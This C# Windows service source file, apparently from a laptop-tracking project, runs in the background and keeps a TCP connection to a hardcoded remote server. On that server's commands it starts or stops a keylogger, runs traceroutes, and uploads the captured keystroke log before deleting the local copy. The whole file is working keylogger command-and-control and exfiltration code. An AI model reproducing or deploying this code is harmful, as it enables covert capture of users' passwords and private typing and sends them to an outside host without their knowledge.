using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets; //used for TcpClient class
using System.Net; //used for IPEndPoint class
using System.Threading;
using System.IO;
using KeyloggerCommunications;
using System.ServiceModel;
using System.Net.NetworkInformation;

namespace WindowsServiceTracker
{
    /***********************************************************************
     * This class is where the majority of the work of the service is done.
     * Currently the only functionality not done exclusively in this service
     * is the keylogging. Keylogging is done in the WTKL project in the
     * SystemTrayKeylogger.cs file.
     ***********************************************************************/
    public partial class Tracker : ServiceBase, KeyloggerCommInterface
    {
        //Constants
        //127.0.0.1 = 0x0100007F because of network byte order
        public const byte KEYLOG_ON = 0;
        public const byte KEYLOG_OFF = 1;
        public const byte TRACE_ROUTE = 2;
        public const byte KEYLOG = 3;
        private const int PORT = 10011;
        private const string ERROR_LOG_NAME = "TrackerErrorLog";
        private const string ERROR_LOG_MACHINE = "TrackerComputer";
        private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";

        //Variables
        private volatile String ipAddressString = "131.204.27.103";
        private long ipAddress = 0x0100007F; //default to local host
        private IPEndPoint ipPort;
        private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
            new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
        private KeyloggerCommInterface pipeProxy;
        private Thread tcpThread;
        private volatile bool tcpKeepAlive = true;
        private volatile string macAddress = null;
        private volatile String keyLogFilePath;

        // Variables in this block are intended to be used only with the thread
        // maintaining the tcp connection. They are not thread safe and should
        // not be used by other threads without making them volatile.
        private NetworkStream tcpStream;
        private TcpClient tcp;

        /* Constructor for the service. Currently only creates an event log source
         * that is used to output errors with in the windows event logs.
         */
        public Tracker()
        {
            InitializeComponent();
            //Creates the error log source if it doesn't already exist
            if (!EventLog.SourceExists(ERROR_LOG_SOURCE))
            {
                EventLog.CreateEventSource(ERROR_LOG_SOURCE, ERROR_LOG_NAME);
            }
        }

        /* This method is the first method to be ran when the service starts running. For pretty
         * much all intents and purposes this is simply the main method.
         */
        protected override void OnStart(string[] args)
        {
            //Use the following line to launch an instance of visual studio to debug
            //with. You can also just run the service and then attach the debugger
            //to the process.
            //System.Diagnostics.Debugger.Launch();

            //Keep the service running for 15 seconds
            //Thread.Sleep(15000);

            //Sets the current directory to where the WindowsServiceTracker.exe is located rather
            //than some Windows folder that I couldn't seem to locate
            System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);

            string tempIP = tempConfigFileIP();
            if (tempIP != null)
            {
                ipAddressString = tempIP;
            }

            //convert string IP to long
            try
            {
                ipAddress = BitConverter.ToInt64(IPAddress.Parse(ipAddressString).GetAddressBytes(), 0);
            }
            catch (Exception)
            { }
            ipPort = new IPEndPoint(ipAddress, PORT);

            CreateOpenPipe();
            keyLogFilePath = GetKeylogFilePath();
            //StartKeylogger(); //todo remove after debugging

            tcpThread = new Thread(this.MaintainServerConnection);
            tcpThread.Start();
        }

        /*This method runs immediately before the service stops and shuts down. So all writing to
        * config/settings files and closing connections should be done here.
         */
        protected override void OnStop()
        {
            StopKeylogger();
            Disconnect();
            tcpKeepAlive = false;
            if (tcpThread != null && tcpThread.IsAlive)
            {
                tcpThread.Join();
            }
        }

        /*Creates the pipe over which keylogger functions can be called. Functions are called
        * using pipeProxy.FunctionName();
         */
        private void CreateOpenPipe()
        {
            pipeProxy = pipeFactory.CreateChannel();
        }

        //Starts the keylogger
        public bool StartKeylogger()
        {
            if (CheckIfRunning())
            {
                return pipeProxy.StartKeylogger();
            }
            return false;
        }

        //Stops the keylogger
        public bool StopKeylogger()
        {
            if (CheckIfRunning())
            {
                return pipeProxy.StopKeylogger();
            }
            return false;
        }

        /* Get location of keylog file
         */
        public String GetKeylogFilePath()
        {
            if (CheckIfRunning())
            {
                return pipeProxy.GetKeylogFilePath();
            }
            return String.Empty;
        }

        //Checks to see if the keylogger program is running
        public bool CheckIfRunning()
        {
            try
            {
                return pipeProxy.CheckIfRunning();
            }
            catch (Exception)
            {
                return false;
            }
        }

        /* This method writes to the windows event logs with an "Information" event
         * type. All you have to do for it to work is call the method with a string
         * as the argument and it will write an event for you. Useful for error/bug
         * output
         */
        private void WriteEventLogEntry(string eventLogInput)
        {
            //Write to the Windows Event Logs, shows up under Windows Logs --> Application
            EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
        }

        /* Gets the MAC address of the laptop. The method loops through all existing network
         * adapters looking for an ethernet adapter, if one is found then it is immediately
         * returned. If not, then it looks for the first WiFi adapter in the list. If it finds 
         * a wifi adapter it will continue looping to prioritize for ethernet. If neither WiFi 
         * nor Ethernet is found then the MAC address of the active adapter is used.
         */
        private string getMacAddress()
        {
            string mac = string.Empty;

            bool keepUnlessEthernet = false;
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    return nic.GetPhysicalAddress().ToString();
                }
                else if (!keepUnlessEthernet && nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
                {
                    mac = nic.GetPhysicalAddress().ToString();
                    keepUnlessEthernet = true;
                }
                else if (mac == string.Empty && nic.OperationalStatus == OperationalStatus.Up)
                {
                    mac = nic.GetPhysicalAddress().ToString();
                }
            }

            return mac;
        }

        /* This method is used to create a thread that will constantly try to connect
         * to the server while it is active. When a connection is established, the
         * MAC address is immidiately sent to the server and it waits for commands.
         */
        private void MaintainServerConnection()
        {
            macAddress = getMacAddress();
            int maxwaitBetweenConnects = 60;
            int waitToConnect = 0;
            int bufferSize = 1;
            byte[] buffer = new byte[bufferSize];
            while (tcpKeepAlive)
            {
                if (tcp == null || !tcp.Connected)
                {
                    try 
                    {
                        Connect();
                        waitToConnect = 0;
                        getTcpStream();
                        SendStringMsg(macAddress);
                    }
                    catch (Exception)
                    {
                        Thread.Sleep(waitToConnect * 1000);
                        if (waitToConnect < maxwaitBetweenConnects)
                        {
                            waitToConnect += 5;
                        }
                    }
                }
                else
                {
                    // todo make sure thCanRead is false in the case that a previous connection was lost, 
                    // and new one created, but the stream was not changed from the old connection
                    if (tcpStream == null || !tcpStream.CanRead)
                    {
                        getTcpStream();
                    }
                    else 
                    {
                        try 
                        {
                            int bytesRead;
                            bytesRead = tcpStream.Read(buffer, 0, bufferSize);

                            if (bytesRead == 0)
                            {
                                tcp = null;
                                tcpStream = null;
                            }
                            else {
                                switch (buffer[0])
                                {
                                    case KEYLOG_ON:
                                        StartKeylogger();
                                        break;
                                    case KEYLOG_OFF:
                                        StopKeylogger();
                                        break;
                                    case TRACE_ROUTE:
                                        sendTraceRouteInfo();
                                        break;
                                    case KEYLOG:
                                        sendKeylog();
                                        break;
                                    default:
                                        break;
                                }
                            }
                        }
                        catch (Exception)
                        {}
                    }
                }
            }
        }

        /* Creates a new connection with the server.
         */
        private bool Connect()
        {
            try
            {
                tcp = new TcpClient();
                tcp.Connect(ipPort);
                return true;
            }
            catch (Exception)
            {
                throw new Exception("Error connecting");
            }
        }

        /* Closes the TCP connection with the server
         */
        private bool Disconnect()
        {
            try
            {
                tcpStream.Close();
            }
            catch (NullReferenceException)
            { }
            return true;
        }

        /* Attempts to get get the NetworkStream from the tcp connection and
         * assign it to the tcpStream variable.
         */
        private bool getTcpStream()
        {
            try
            {
                tcpStream = tcp.GetStream();
            }
            catch (InvalidOperationException)
            {
                return false;
            }
            return true;
        }

        /* Attempts to write the message passed in as an argument to the TCP Stream
         */
        private bool SendStringMsg(string stringMsg)
        {
            if (tcpStream != null && tcpStream.CanWrite)
            {
                byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
                tcpStream.Write(msg, 0, msg.Length);
                return true;
            }
            return false;
        }

        /* Performs a trace route and sends it over the current connection
         * in the form <opcode>IP~IP~IP~...newline
         */
        private bool sendTraceRouteInfo()
        {
            String ipString = traceRoute(ipAddressString);
            if (tcpStream != null && tcpStream.CanWrite)
            {
                byte[] msg = Encoding.UTF8.GetBytes(ipString + Environment.NewLine);
                byte[] combinedMsg = new byte[msg.Length + 1];
                combinedMsg[0] = TRACE_ROUTE;
                msg.CopyTo(combinedMsg, 1);
                tcpStream.Write(combinedMsg, 0, combinedMsg.Length);
                return true;
            }
            return false;
        }

        /* Performs a traceroute to the given address. Returns a string of
         * IP addresses delimited by '~'
         */
        private String traceRoute(String address)
        {
            String ipString = String.Empty;
            IEnumerable<IPAddress> ipList = IP.getTraceRoute(address);
            foreach (IPAddress nodeAddress in ipList)
            {
                ipString += nodeAddress + "~";
            }
            try
            {
                ipString = ipString.Remove(ipString.Length - 1);
            }
            catch (ArgumentOutOfRangeException)
            {

            }
            return ipString;
        }

        /* sends the contents of the keylog file to the server
         * and deletes it.
         */
        private bool sendKeylog()
        {
            bool success = true;
            StreamReader log = null;
            String tempFile = "tempFile.txt";
            int bufferSize = 1024;
            char[] buffer = new char[bufferSize];
            int bytesRead;
            byte[] msg;
            bool storedFileExists = false;

            // see if an unsent file exists
            try
            {
                log = new StreamReader(tempFile);
                storedFileExists = true;
            }
            catch (Exception)
            { }

            // if there is not an unsent file, grab the active one
            if (!storedFileExists)
            {
                try
                {
                    File.Move(keyLogFilePath, tempFile);
                    log = new StreamReader(tempFile);
                }
                catch (Exception)
                {
                    //return false;
                }
            }

            try
            {
                /*
                msg = new byte[1];
                msg[0] = KEYLOG;
                tcpStream.Write(msg, 0, msg.Length);
                 */

                // the nested try block is so that when there is no keylog file,
                // it still sends the opcode and newline char
                try
                {
                    while (!log.EndOfStream)
                    {
                        int offset = 0;
                        byte[] combinedMsg;
                        string logRead = log.ReadToEnd();
                        msg = Encoding.UTF8.GetBytes(logRead);
                        byte[] newLine = Encoding.UTF8.GetBytes(Environment.NewLine);

                        combinedMsg = new byte[1 + msg.Length + newLine.Length];

                        combinedMsg[0] = KEYLOG;
                        offset += 1;

                        msg.CopyTo(combinedMsg, offset);
                        offset += msg.Length;

                        newLine.CopyTo(combinedMsg, offset);
                        offset += newLine.Length;

                        tcpStream.Write(combinedMsg, 0, combinedMsg.Length);
                    }
                }
                catch (Exception)
                {

                }

                /*
                msg = Encoding.UTF8.GetBytes(Environment.NewLine);
                tcpStream.Write(msg, 0, msg.Length);
                */
            }
            catch (Exception)
            {
                success = false;
            }

            try
            {
                log.Close();
                if (success)
                {
                    File.Delete(tempFile);
                    // if we sent an old file, send new one now
                    if (storedFileExists)
                    {
                        sendKeylog();
                    }
                }
            }
            catch (Exception)
            {
                //return false;
            }
            return success;
        }

        /* Temporary configfile with IP
         */
        private string tempConfigFileIP()
        {
            StreamReader configFileReader = null;
            String configFile = "config.txt";
            string IP = null;

            try
            {
                configFileReader = new StreamReader(configFile);
                IP = configFileReader.ReadToEnd();
                configFileReader.Close();
            }
            catch (Exception)
            { }
            return IP;
        }
    }
}
